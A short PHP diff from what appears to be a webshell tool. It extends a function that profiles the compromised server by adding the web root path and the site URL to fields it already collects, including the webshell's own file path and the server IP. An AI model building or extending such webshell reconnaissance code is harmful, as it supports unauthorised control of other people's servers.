@@ -11,7 +11,9 @@ function run($vars){
         'sep'=>DIRECTORY_SEPARATOR,
         'os_bit'=>32,
         'webshell_addr'=>$_SERVER['SCRIPT_FILENAME'],
-        'ip_addr'=>$_SERVER['SERVER_ADDR']
+        'ip_addr'=>$_SERVER['SERVER_ADDR'],
+        'www_root'=>$_SERVER['DOCUMENT_ROOT'],
+        'website'=>$_SERVER['REQUEST_SCHEME']."://".$_SERVER['SERVER_NAME'].":".$_SERVER['SERVER_PORT']
     );
     if(strpos(strtoupper(PHP_OS), "WIN")===false){
         $tmp = tempnam($info['tmpdir'], "");
